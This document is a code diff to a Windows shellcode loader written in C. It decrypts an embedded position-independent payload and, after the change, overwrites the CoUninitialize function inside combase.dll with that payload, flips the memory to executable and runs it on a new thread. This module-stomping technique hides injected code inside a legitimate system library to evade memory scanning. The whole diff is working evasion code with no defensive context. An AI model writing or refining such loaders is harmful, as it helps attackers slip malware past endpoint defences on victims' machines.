@@ -154,23 +154,22 @@ int WINAPI WinMain(HINSTANCE hi, HINSTANCE hp, LPSTR lp, int ns)
     LocalFree(ct);
     if (!pt) return 1;
 
-    /* Copy into RW region, wipe heap copy, flip to RX */
-    void *rw = VirtualAlloc(NULL, pt_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-    if (!rw) { LocalFree(pt); return 1; }
+    HMODULE mod = LoadLibraryA("combase.dll");
+    if (!mod) { LocalFree(pt); return 1; }
+    void *slot = (void *)GetProcAddress(mod, "CoUninitialize");
+    if (!slot) { LocalFree(pt); return 1; }
 
-    memcpy(rw, pt, pt_len);
+    DWORD old;
+    if (!VirtualProtect(slot, pt_len, PAGE_READWRITE, &old)) {
+        LocalFree(pt); return 1;
+    }
+    memcpy(slot, pt, pt_len);
     SecureZeroMemory(pt, pt_len);
     LocalFree(pt);
 
-    DWORD old;
-    if (!VirtualProtect(rw, pt_len, PAGE_EXECUTE_READ, &old)) {
-        VirtualFree(rw, 0, MEM_RELEASE);
-        return 1;
-    }
+    if (!VirtualProtect(slot, pt_len, PAGE_EXECUTE_READ, &old)) return 1;
 
-    /* Execute Crystal Palace PICO on a dedicated thread.
-     * +gofirst puts go() at offset 0; args are NULL (baked at link time). */
-    HANDLE h = CreateThread(NULL, 0, worker, rw, 0, NULL);
+    HANDLE h = CreateThread(NULL, 0, worker, slot, 0, NULL);
     if (!h) return 1;
 
     WaitForSingleObject(h, INFINITE);
